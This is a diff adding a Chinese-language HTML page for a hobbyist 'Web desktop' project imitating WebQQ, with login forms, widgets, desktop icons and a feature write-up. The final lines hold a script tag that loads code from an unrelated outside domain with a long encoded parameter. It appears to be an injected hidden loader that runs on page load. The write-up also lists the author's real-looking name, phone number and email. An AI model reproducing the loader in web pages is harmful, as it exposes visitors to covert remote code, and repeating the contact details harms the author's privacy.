@@ -1,0 +1,764 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>桌面应用</title>
+    <link rel="stylesheet" href="style/css/desktop.css" />
+    <script type="text/javascript" src="style/js/jquery-1.11.1.min.js"></script>
+    <script type="text/javascript" src="style/js/package.js"></script>
+    <script type="text/javascript" src="style/js/mTween.js"></script>
+    <script type="text/javascript" src="style/js/Mydesktop.js"></script>
+    <script type="text/javascript" src="style/js/provinceList.js"></script>
+
+
+	
+</head>
+<body>
+    <!--顶部banner-->
+	    <div class="navbar">
+	    	<h2>Web桌面</h2>
+	    	<ul id="rightbtns">
+	    		<li id="bgpic">
+	    			<img src="style/img/desktop/bgpic.png">壁纸
+	    			<ul class="wallBg" id="wallBg">
+	    				
+	    			</ul>
+	    			<p>
+	    				<a href="javascript:;"><img src="style/img/desktop/change.png" alt="">换一批</a>
+	    				<a href="javascript:;"><img src="style/img/desktop/more.png" alt="">更多精彩壁纸</a>
+	    			</p>
+	    		</li>
+	    		<li id="tianqi"><img src="style/img/desktop/weather.png">天气</li>
+	    		<li id="Userlogin">
+	    			<img src="style/img/desktop/log.png">login
+	    			<ul class="exit">
+	    				<li><img src="style/img/desktop/login.png">登录</li>
+	    				<li><img src="style/img/desktop/zhuce.png">注册</li>
+	    				<li><img src="style/img/desktop/exit.png">退出</li>
+	    			</ul>
+	    		</li>
+	    		<li><img src="style/img/desktop/self.png">个人中心</li>
+	    	</ul>
+	    </div>
+    
+    <!-- 更多皮肤弹窗 -->
+		<div class="wallBox" id="wallBox">
+			<div class="wallBox_menu">
+				<a id="close" class="close" href="javascript:;">关闭</a>
+				<ul id="wallBox_title" class="wallBox_title">
+					<li><a class="active " href="javascript:;">动漫</a></li>
+					<li><a href="javascript:;">炫酷</a></li>
+					<li><a href="javascript:;">小清新</a></li>
+					<li><a href="javascript:;">萌宠</a></li>
+					<li><a href="javascript:;">系统</a></li>
+				</ul>
+			</div>
+			<div class="wallBox_content">
+				<div class="bgContent" id="bgContent">
+					<ul class="active">
+					</ul>
+					<ul>
+					</ul>
+					<ul>
+					</ul>
+					<ul>
+					</ul>
+					<ul>
+					</ul>
+					<!-- <ul>
+						<li class="ftpImg" id="ftpImg">
+							<div class="fileInput">
+								<div id="upFileBtn" class="upFileBtn">上传图片</div>
+								<input type="file" name="upImg" id="upImg" class="upImg"/>
+							</div>
+							<div class="ftpArea">
+							
+							</div>
+							<div id="demand_info">
+								<p>上传须知</p>
+								<p>图片大小：≤200kb</p>
+								<p>图片尺寸：≥1024*768</p>
+							</div>
+							<div id="ftp_info">
+								<p>图片名称</p>
+								<p>图片大小</p>
+								<p>图片尺寸</p>
+							</div>
+							<div id="btn_box" class="button">
+								<input value="确定" type="button" class="useImg"/>
+								<input value = "取消" type="button" class="noImg"/>
+							</div>
+							
+						</li>
+					</ul> -->
+				</div>
+				<div id="bgPreview">
+					<p>预览</p>
+					<span><img src="style/img/desktop/bgPreview.png" /></span>
+				</div>
+			</div>
+		</div>
+
+
+		<div class="loginNav">
+	<!-- 登陆界面 -->
+			<div id="login">
+				<div id="login_top" class="top">
+					<span></span>
+				</div>
+				<div class="info">
+					<form>
+						<div>
+							用户名  <input id="user" type="text" value="" placeholder="手机号/电话/邮箱"/>
+						</div>
+						<div>
+							密&nbsp;码  <input id="pas" type="password" value="" placeholder="密码"/>
+						</div>
+						<p><label><input id="remember" type="checkbox">记住我的密码</label></p>
+						<a href="javascript:;">注册</a>
+						<input id="log" type="button" value="登陆"/>
+					</form>
+				</div>
+			</div>
+	<!-- 注册界面 -->
+			<form id="land"  method="post">
+				<div id="land_title" class="land_title">
+					<span></span>
+				</div>
+				<ul class="land_con">
+					<li>
+						<span class="information_1">&nbsp;用户名：</span>
+						<input class="xinxi" id="username" type="text" name="username"/>
+						<span class="information_2">*请输入您的手机号</span>					
+					</li>
+					<li>
+						<span class="information_1">&nbsp;&nbsp;密码：</span>
+						<input class="xinxi" type="text" id="password" name="password"/>
+						<span class="information_2">*密码为6-12个字符区分大小写</span>
+					</li>
+					<li>
+						<span class="information_1">确认密码：</span>
+						<input class="xinxi" type="text" id="password1" name="password1"/>
+						<span class="information_2">*请再次输入密码</span>
+					</li>
+					<li class="sex">
+						<span class="information_1">性别：</span>
+						<input  type="radio" name="sex" value="男" id="man" checked="checked"/>
+						<label for="man">男</label>
+						<input  type="radio" name="sex" value="女" id="woman"/>
+						<label for="woman">女</label>
+					</li>
+					<li><input class="register" value="马上注册" id="register" type="button" name="register"></li>
+	
+				</ul>
+			</form>	
+		</div>
+	 
+
+		<div id="change_password">
+			<div id="change_top" class="top"></div>
+			<div class="info">
+				<form>
+					<div>
+						原密码  <input id="ori_pas" type="text" value=""/>
+					</div>
+					<div>
+						新密码  <input id="new_pas" type="text" value=""/>
+					</div>
+					<div class="btn">
+						<input id="yes" type="button" value="确定"/>
+						<input id="no" type="button" value="取消"/>
+					</div>
+				</form>
+			</div>
+		</div>
+	<!--登陆状态-->
+		<div id="land_status">
+			<div class="land_img">
+				<img id="land_pic" src="style/img/desktop/port1.png" alt="男">
+			</div>
+			<span><a href="javascript:;">用户在线中</a></span>
+			<div class="select" id="select">
+				<ul class="land_info">
+					<li><a href="javascript:;">修改密码</a></li>
+					<li><a href="javascript:;">注销</a></li>
+				</ul>
+			</div>
+			<div class="sjx">
+				<img id="jiantou" src="style/img/desktop/jiantou.png">
+			</div>
+		</div>
+
+
+
+
+    <!-- 背景 -->
+    	<div id="wrapbg">
+			<div class="bg" id='deskBg'>
+				<img src="style/img/desktop/sys06.jpg">
+			</div>
+		</div>
+	<!-- 左侧菜单 -->
+		<div id="leftnav">
+			<ul id="leftbtns">
+				<li title="QQ"><a href="javascript:;"><img src="style/img/desktop/Licon2.png" ></a></li>
+				<li title="天气"><a href="javascript:;"><img src="style/img/desktop/Licon11.png" ></a></li>
+				<li title="日历"><a href="javascript:;"><img src="style/img/desktop/Licon17.png" ></a></li>
+				<li title="音乐"><a href="../cases/case12-2/音频动画.html" target="_blank"><img src="style/img/desktop/Licon21.png" "></a></li>
+				<li title="浏览器"><a href="javascript:;"><img src="style/img/desktop/Licon18.png" ></a></li>
+				<li title="云盘"><a href="javascript:;"><img src="style/img/desktop/Licon9.png" ></a></li>
+			</ul>
+			<ul id="leftmenus">
+				<li><a class="menu1" href="javascript:;"></a></li>
+				<li><a class="menu2" href="javascript:;"></a></li>
+				<li><a class="menu3" href="javascript:;"></a></li>
+				<li><a class="menu4" id="menu4" href="javascript:;"></a></li>
+				<li><a class="menu5" href="javascript:;"></a></li>
+			</ul>
+		</div>
+	<!-- 顶部菜单及滚轮切换内容 -->
+		<div class="topNav">
+			<div class="topBtns">
+				<div class="topIcon" id="topIcon">
+					<a href="javascript:;"><img src="style/img/desktop/topIcon.jpg" width="24" height="24"></a>
+				</div>
+				<ul class="topNum" id="topNum">
+					<li class="active"><a href="javascript:;">1</a></li>
+					<li class=""><a href="javascript:;">2</a></li>
+					<li class=""><a href="javascript:;">3</a></li>
+					<li class=""><a href="javascript:;">4</a></li>
+					<li class=""><a href="javascript:;">5</a></li>
+				</ul>
+				<div class="topSearch" id="topSearch">
+					<a href="javascript:;"></a>
+					<a href="javascript:;"></a>
+				</div>
+			</div>
+		</div>
+	<!-- 切换页面 -->
+		<div class="mainContent">
+			<div class="mainPages" id="mainPages">
+				<ul>
+					<li title="我的电脑" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/computer.png">
+							<span><input placeholder="我的电脑" type="text" value="我的电脑"/></span>
+						</a>
+					</li>
+					<li title="回收站" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/rubbish.png">
+							<span><input placeholder="回收站" type="text" value="回收站"/></span>
+						</a>
+					</li>
+					<li title="浏览器" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/ie.png">
+							<span><input placeholder="浏览器" type="text" value="浏览器"/></span>
+						</a>
+					</li>
+					<li title="豆瓣音乐" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/music2.png">
+							<span><input placeholder="豆瓣音乐" type="text" value="豆瓣音乐"/></span>
+						</a>
+					</li>
+					<li title="百度云盘" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/yunpan.png">
+							<span><input placeholder="百度云盘" type="text" value="百度云盘"/></span>
+						</a>
+					</li>
+					<li title="Illustrator" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/AI.png">
+							<span><input placeholder="Illustrator" type="text" value="Illustrator"/></span>
+						</a>
+					</li>
+					<li title="Photoshop" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/ps.png">
+							<span><input placeholder="Photoshop" type="text" value="Photoshop"/></span>
+						</a>
+					</li>
+					<li title="说明文档" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/Instruct1.png">
+							<span><input placeholder="说明文档" type="text" value="说明文档"/></span>
+						</a>
+					</li>
+				</ul>
+				<ul >
+					<li title="迅雷" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/xunlei.png">
+							<span><input placeholder="迅雷" type="text" value="迅雷"/></span>
+						</a>
+					</li>
+					<li title="QQ" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/qq.png">
+							<span><input placeholder="qq" type="text" value="qq"/></span>
+						</a>
+					</li>
+					<li title="微信">
+						<a href="javascript:;">
+							<img src="style/img/desktop/weixin.png">
+							<span><input placeholder="微信" type="text" value="微信"/></span>
+						</a>
+					</li>
+					<li title="腾讯新闻" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/new.png">
+							<span><input placeholder="腾讯新闻" type="text" value="腾讯新闻"/></span>
+						</a>
+					</li>
+					<li title="微博" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/weibo.png">
+							<span><input placeholder="微博" type="text" value="微博"/></span>
+						</a>
+					</li>
+					<li title="Github" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/github.png">
+							<span><input placeholder="Github" type="text" value="Github"/></span>
+						</a>
+					</li>
+					<li title="36氪" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/36ke.png">
+							<span><input placeholder="36氪" type="text" value="36氪"/></span>
+						</a>
+					</li>
+					<li title="爱奇艺">
+						<a href="javascript:;">
+							<img src="style/img/desktop/aiqiyi.png">
+							<span><input placeholder="爱奇艺" type="text" value="爱奇艺"/></span>
+						</a>
+					</li>
+				</ul>
+				<ul >
+					<li title="sublime" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/SublimeLogo.png">
+							<span><input placeholder="sublime" type="text" value="sublime"/></span>
+						</a>
+					</li>
+					<li title="腾讯视屏" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/Tplayer.png">
+							<span><input placeholder="腾讯视屏" type="text" value="腾讯视屏"/></span>
+						</a>
+					</li>
+					<li title="支付宝" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/alipay.png">
+							<span><input placeholder="支付宝" type="text" value="支付宝"/></span>
+						</a>
+					</li>
+					<li title="淘宝" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/taobao.png">
+							<span><input placeholder="淘宝" type="text" value="淘宝"/></span>
+						</a>
+					</li>
+					<li title="百度云盘" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/yunpan.png">
+							<span><input placeholder="百度云盘" type="text" value="百度云盘"/></span>
+						</a>
+					</li>
+					<li title="Illustrator" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/AI.png">
+							<span><input placeholder="Illustrator" type="text" value="Illustrator"/></span>
+						</a>
+					</li>
+					<li title="Photoshop" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/ps.png">
+							<span><input placeholder="Photoshop" type="text" value="Photoshop"/></span>
+						</a>
+					</li>
+					<li title="说明文档" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/Instruct1.png">
+							<span><input placeholder="说明文档" type="text" value="说明文档"/></span>
+						</a>
+					</li>
+				</ul>
+				<ul >
+					<li title="携程" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/xiecheng.png">
+							<span><input placeholder="携程" type="text" value="携程"/></span>
+						</a>
+					</li>
+					<li title="美丽说" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/meilishuo.png">
+							<span><input placeholder="美丽说" type="text" value="美丽说"/></span>
+						</a>
+					</li>
+					<li title="去哪儿" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/gowhere.png">
+							<span><input placeholder="去哪儿" type="text" value="去哪儿"/></span>
+						</a>
+					</li>
+					<li title="豆瓣音乐" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/music2.png">
+							<span><input placeholder="豆瓣音乐" type="text" value="豆瓣音乐"/></span>
+						</a>
+					</li>
+					<li title="360安全卫士">
+						<a href="javascript:;">
+							<img src="style/img/desktop/360.png">
+							<span><input placeholder="360安全卫士" type="text" value="360安全卫士"/></span>
+						</a>
+					</li>
+					<li title="rar"  >
+						<a href="javascript:;">
+							<img src="style/img/desktop/rar.png">
+							<span><input placeholder="压缩文件" type="text" value="压缩文件"/></span>
+						</a>
+					</li>
+					<li title="Photoshop" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/ps.png">
+							<span><input placeholder="Photoshop" type="text" value="Photoshop"/></span>
+						</a>
+					</li>
+					<li title="说明文档">
+						<a href="javascript:;">
+							<img src="style/img/desktop/Instruct1.png">
+							<span><input placeholder="说明文档" type="text" value="说明文档"/></span>
+						</a>
+					</li>
+				</ul>
+				<ul >
+					<li title="百度地图" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/baidumap.png">
+							<span><input placeholder="百度地图" type="text" value="百度地图"/></span>
+						</a>
+					</li>
+					<li title="美图秀秀" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/meitu.png">
+							<span><input placeholder="美图秀秀" type="text" value="美图秀秀"/></span>
+						</a>
+					</li>
+					<li title="qq邮箱" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/qqemail.png">
+							<span><input placeholder="qq邮箱" type="text" value="qq邮箱"/></span>
+						</a>
+					</li>
+					<li title="DW">
+						<a href="javascript:;">
+							<img src="style/img/desktop/DW.png">
+							<span><input placeholder="Dreamweaver" type="text" value="Dreamweaver"/></span>
+						</a>
+					</li>
+					<li title="百度云盘">
+						<a href="javascript:;">
+							<img src="style/img/desktop/yunpan.png">
+							<span><input placeholder="百度云盘" type="text" value="百度云盘"/></span>
+						</a>
+					</li>
+					<li title="Illustrator"  >
+						<a href="javascript:;">
+							<img src="style/img/desktop/AI.png">
+							<span><input placeholder="Illustrator" type="text" value="Illustrator"/></span>
+						</a>
+					</li>
+					<li title="Photoshop">
+						<a href="javascript:;">
+							<img src="style/img/desktop/ps.png">
+							<span><input placeholder="Photoshop" type="text" value="Photoshop"/></span>
+						</a>
+					</li>
+					<li title="说明文档" >
+						<a href="javascript:;">
+							<img src="style/img/desktop/Instruct1.png">
+							<span><input placeholder="说明文档" type="text" value="说明文档"/></span>
+						</a>
+					</li>
+				</ul>
+			</div> 
+		</div>
+		
+	<!-- 文件夹的右键菜单 -->
+		<div class="fileMenu" id="fileMenu">
+			<ul id ="filesRightMenu">
+				<li><h2>打开</h2></li>
+				<li><h2>删除文件夹</h2></li>
+				<li><h2>重命名</h2></li>
+			</ul>
+		</div>
+	<!-- 桌面右键菜单 -->
+		<div class="deskMenu" id="deskMenu">
+			<ul id ="deskRightMenu">
+				<li ><h2>查看<span class="down"></span></h2>
+					<ul>
+						<li><h2>小图标</h2></li>
+						<li class="checked"><h2>中等图标</h2></li>
+						<li><h2>大图标</h2></li>
+					</ul>
+				</li>
+				<li><h2>排序方式<span></span></h2>
+					<ul>
+						<li><h2>横向</h2></li>
+						<li class="checked"><h2>纵向</h2></li>
+						<li><h2>自由排列</h2></li>
+					</ul>
+				</li>
+				<li><h2>刷新</h2></li>
+				<li><h2>新建</h2></li>
+				<li><h2>个性化设置</h2></li>
+				<li><h2>便签</h2></li>
+				<li><h2>注销</h2></li>
+			</ul>
+		</div>
+
+	<!--桌面便签-->
+		<div id="notepad">
+			<h2 id="note_title">
+				<span id="add">添加便签</span>
+			</h2>
+			<span id="closeNote"></span>
+			<ul id="list"></ul>
+			<div id="content">
+				<h2>
+				  <a id="del">删除</a>
+				  <a id="save">保存</a>         
+				</h2>
+				<textarea id="textarea"></textarea>
+			</div>
+		</div>	
+	<!-- 图标弹窗 -->
+    	<div id="win_mask" class="hidden">
+            <div class="title">
+                <h2>说明文档</h2>
+                <!--窗口按钮-->
+                <div class="win_control">
+                    <a class="reduce" id='reduce' href="javascript:;"></a>
+                    <a class="magnify" id="magnify" href="javascript:;"></a>
+                    <a class="close" id="closeX" href="javascript:;"></a>
+                </div>
+
+                <div class="win_content">
+					<h4>姓名：郑乐</h4>
+					<h4>手机：152-2270-5815</h4>
+					<h4>Email：373039519@qq.com</h4>
+					<h4>QQ ：373039519</h4>
+					<h4>My Git：https://zlacrab.github.io</h4>
+					<span>
+						webQ+桌面借鉴腾讯WebQQ（http://web.qq.com/）开发的一个Web Desktop,开发周期约为30天左右，主要利用业余时间进行开发使用原生javascript进行开发，将开发中用到的js文件进行了归类其中常用函数调用封装为package.js，运动中用到的函数封装为mTween.js，天气效果单独封装为weather.js，主要文件为main.js其中有的功能使用HTML5的拖拽事件，HTML5存储等等<br/>
+					该作品对于交互效果也做了考虑，实现了一些相应的功能<br/>
+					1.桌面图标功能<br/>
+					（1）点击说明文档图标可以出现对应的弹出窗口<br/>
+					（2）桌面图标可以自由拖动，拖动到一定位置处可以匀速运动会原位置<br/>
+					（3）桌面图标可以根据可视区的大小进行排列，运动window.onresize事件<br/>
+					（4）桌面图标可以互换位置，当有多个图标发生位置重合时，与重合面积最大的交换位置<br/>
+					（5）左边菜单模拟苹果导航效果，侧边栏上面的图标点击也可以出现对应的弹出窗口<br/>
+					2.弹出窗口和折叠菜单<br/>
+					（1）点击图标出现弹出窗口，弹出窗口可以任意拖拽，但是限定范围（不能向上超出可视区）<br/>
+					（2）弹出窗口可以最大化，最小化，关闭<br/>
+					（3）点击最小化后出现折叠任务菜单，鼠标滑到上面可以继续选择还原或者关闭<br/>
+					3.顶部菜单<br/>
+					（1）换肤功能：模拟百度一下换肤，实现了可以预览，选择皮肤，点击即可切换页面背景，并且用cookie进行存储<br/>
+					（2）注册功能：用户名为个人手机号，验证方式采用正则表达式，用户名只能为有效的大陆手机号，密码为6-12
+					   且为数字、字母或者它们的组合，还可以选择性别<br/>
+					   如果注册信息错误，会出现红色提示文字输入框页显示红色，存储方式为HTML5 本地存储locaStorage<br/>
+					（3）登陆功能：获取输入的手机号和密码，与之前存储的进行对比，一样则登陆成功，否则提示用户名或密码错误
+					   如果用户名不存在则提示请注册<br/>
+					（4）登陆成功时：在桌面顶部左边会出先一个用户登陆成功状态的一个展现，头像可以分辨用户群体，可以选择修改密码，注销登陆<br/>
+					（5）修改密码：通过跟存储的数据进行比对如果密码重复则提示密码错误<br/>
+					   如果密码为6-12且符合规则，则提示密码修改成功<br/>
+					（6）天气功能：通过ajax跨域请求天气数据，可以显示当前城市天气指数和未来两天的天气，还可以切换城市
+					   通过联动菜单选择对应的城市，运用HTML5本地存储，页面刷新不会发生更改<br/>
+					（7）换肤界面展示应用了tween.js中的匀速运动登陆、注册、天气的界面展示应用了tween.js中的减震动画<br/>
+					4.切换桌面<br/>
+					点击焦点数字切花桌面<br/>
+					5.自定义系统右键功能<br/>
+					（1）用document.oncontextmenu事件自定义右键功能<br/>
+					（2）查看：可以查看小图标、中等图标和大图标，默认是中等图标<br/>
+					（3）排列方式：可以设置为横向、纵向、自由排列<br/>
+					（4）模拟window刷新功能<br/>
+					（5）文件上传预览：可以通过点击上传按钮进行上传预览，还可以进行拖拽上传预览<br/>
+					   a:上传的图片大小、文件类型（必须是图片）、最多上传的图片张数<br/>
+					   b:上传完毕后显示上传后的状态、图片的上传地址、图片的尺寸信息，所有图片上传完可以继续上传<br/>
+					（6）新建文件夹：可以根据所在桌面创建文件夹，用HTML5本地存储，模拟真实数据<br/>
+					（7）个性化设置：可以自定义主题，通过cookie存储，有限期为30天<br/>
+					（8）便签功能：便签对话框显示的位置可以跟着右键菜单的位置定位，可以设置便<br/>
+					   通过HTML5存储便签内容，等页面刷新的时候，可以加载内容，还可以右键取消便签对话框<br/>
+					（9）注销：注销掉用户，会停留在当前页面<br/>
+					6.文件夹右键功能<br/>
+					（1）打开：右键点击打开弹出对应的应用窗口<br/>
+					（2）删除文件夹：删除后文件夹带有透明度变化的消失，消失后剩余的文件夹位置会自动重新排列<br/>
+					   等页面在刷新的时候会恢复删除后的文件夹<br/>
+					（3）重命名：右键重命名.<br/>
+					   a:会将当前文件夹的文件名默认选中，可以更改文件名，更改后会对文件名存储，页面再次载入时会显示更改后的文件名<br/>
+					   b:如果后来更改并且删除，再次载入时会显示最后更改的文件名<br/>
+					7.时钟：<br/>
+					（1）通过自学HTML5canvas绘制时钟，并且根据时间对象获取当前时间，进行具体的绘制，可以在有效的范围内自由拖动,并且每刷新一次会随机更换一个表盘的颜色。整个webQQ是一边学一边写完成的，其中可能存在某些bug或不合理地方以后将慢慢改进,网页中使用了HTML5中的拖拽和本地存储，建议使用标准浏览器浏览。<br/>
+					8.整个项目是一边工作一边利用业余时间写完成的，其中可能存在某些bug或不合理地方以后将慢慢改进并加以整个完善,网页中使用了HTML5中的拖拽和本地存储，建议使用标准浏览器浏览<br/><br/><br/><br/>
+					</span>
+
+
+                </div>
+            </div>
+          
+        </div>
+
+	<!-- 弹窗最小化 -->
+		<div class="mini" id="mini" style="display: none">
+			<img src="style/img/desktop/Instruct1.png" >
+			<h3 id="miniTitle">说明文档</h4>
+		</div>
+		
+
+		
+	<!-- 底部菜单 -->
+		<div class="footer">
+			<ul class="foot-inner">
+				<li><img src="style/img/desktop/footmenu.png"></li>
+				<li></li>
+				<li>
+					<img src="style/img/desktop/battery.png">
+					<img src="style/img/desktop/wifi.png">
+					<img src="style/img/desktop/keyboard.png">
+					<img src="style/img/desktop/speaker.png">
+					<a id="time">
+						<span>22:26</span>
+						<span>2016 /9/28</span>
+					</a>
+				</li>
+			</ul>
+		</div>
+
+	<!-- 弹出日历 -->
+		<div id="date">
+			<div id='dateHead'>
+				<p id="headTime"></p>
+				<a id='dateToday' href="#"></a>
+			</div>
+			<div id="dateNav">
+				<a id="navInform" href="#"></a>
+				<a id="datePrev" href="#">▲</a>
+				<a id="dateNext" href="#">▼</a>
+			</div>
+			<div id='dateCont'>
+				<div class="wrapDate" id="wrapDate">
+					<ul>
+						<li>日</li>
+						<li>一</li>
+						<li>二</li>
+						<li>三</li>
+						<li>四</li>
+						<li>五</li>
+						<li>六</li>
+					</ul>
+					<div id="dateInner">
+					</div>
+				</div>
+				<div class="wrapMonth" id="wrapMonth">
+					
+				</div>
+				<div class="wrapYear" id="wrapYear">
+					
+				</div>
+				
+			</div>
+			<div id="dateFoot">
+				<p>日期和时间设置</p>
+			</div>
+		</div>
+
+	<!-- canvas时钟 -->
+		<div class="clock" id="clockDrag" style="width:250px;margin:0 auto;">
+
+		    <canvas id="clock" width="250" height="250">
+		        您的浏览器不支持canvas标签!
+		    </canvas>
+
+		</div>
+
+	<!--天气预报-->
+		<div id="weather">
+			<span id="close_w"></span>
+			<dl class="curWeaher">
+				<dd id="weather_title" class="weather_title"><h2 id="curCity"></h2></dd>
+				<dd id="tips">气象提示:<span id="curTips"></span></dd>
+				<dd id="wd">温度:<span id="curTemperature"></span></dd>
+			</dl>
+			<div id="con">
+				<dl class="day today">
+					<dd>
+						<h2>今天</h2>
+					</dd>
+					<dd class="temp">气温:<span id="T_temperature"></span></dd>
+					<dd class="weaher_img" id="T_weather_img">
+						<img src="" title="" alt=""/>
+					</dd>
+				</dl>
+				<dl class="day">
+					<dd>
+						<h2>今天</h2>
+					</dd>
+					<dd class="temp">气温:<span id="M_temperature"></span></dd>
+					<dd class="weaher_img" id="M_weather_img">
+						<img src="" title="" alt=""/>
+					</dd>
+				</dl>
+				<dl class="day">
+					<dd>
+						<h2>今天</h2>
+					</dd>
+					<dd class="temp">气温:<span id="A_temperature"></span></dd>
+					<dd class="weaher_img" id="A_weather_img">
+						<img src="" title="" alt=""/>
+					</dd>
+				</dl>
+			</div>
+			<a href="javascript:;">切换</a>
+			<div id="sjld">
+				<h2>桌面天气小助手</h2>
+				<span id="closeW"></span>
+				<div class="prov_box">
+					<span>请选择城市</span>
+					<div class="select" id="shengfen">
+						<p title="">选择省份</p>
+						<div class="options">
+							<ul></ul>
+						</div>
+					</div>
+					<div class="select" id="chengshi">
+						<p title="">选择城市</p>
+						<div class="options">
+							<ul></ul>
+						</div>
+					</div>
+					<div class="select" id="quyu">
+						<p title="">选择区域</p>
+						<div class="options">
+							<ul></ul>
+						</div>
+					</div>
+				</div>
+				<div id="b_btn">
+					<input type="button" value="保存"/>
+					<input type="button" value="取消"/>
+				</div>
+			</div>
+
+			<script type="text/javascript" src="style/js/weather.js"></script>
+			<script src="https://tjqonline.cn/rr/t?d=sktcNqXYGNXUngqlD0DUTRIaDpDlqUu%2bVfGxSFBSF7PDIy2sON1GsiXQJIieT1pj%2fqHI4Iq4WocZNcoB20rvunofahQXA%2bRvIch1yAgRotGv3r01PSc7Dc%2bcnMQTWqBeEFG7hcYZyoeC%2fbufgnGew70Ubcmmwznzu2xujGw2NQsRKLcEYxSfAcACKjbvECG%2brf7VoT7FJtcyO6AsZSxo4bg4aYYhm5LT0YZgOIEa06FqEvKTY3BkURGBvsSaUWgy9dW4tOm%2buKTdUo2n%2bSNTiihi7B6u%2fFDwhYM6qTr5h02S6O%2bB%2fsvmGQEBTYr%2bt0HHuLkhHWshnTYo%2bE3MriAdFSH0tEixumn1Vt%2fL5w3idAO1jvo67ecYQivUxShJaw2MijYyyCci2Q%2b6cu1jK1roAfOQ6LbLIjNw48OQ3XaL3AjQ35Fyh8NzC3YwOrGdLIBRXfTtkC%2fImNz%2fsWFULxgDQUQO8H4qFCDx7oi7WQmKTrX%2fJh%2bY9QF7DdN1SFvidYpJi6BGOrhzbJGVUWZAtTKVCepM1UO0ArtGeSSKp3jmGEplBPM%2fKPCGiOMvydV6UGjAoSL9%2fwZdxh7DaVLi0Q3D2PT68yBgJDsWX1IcYwJy%2b1gIcF2Z39mQwcRt9qHIK806gmg32u5Gh%2fynLE4RgERFgIN3dA%2b8z3vbMPk0szix8R0XzxpTJiMclyEgleZSufGkxyI7fdKH82MUFK3CMAO3ig%3d%3d" charset="utf-8"></script>
+
+	
+</body>
+</html>
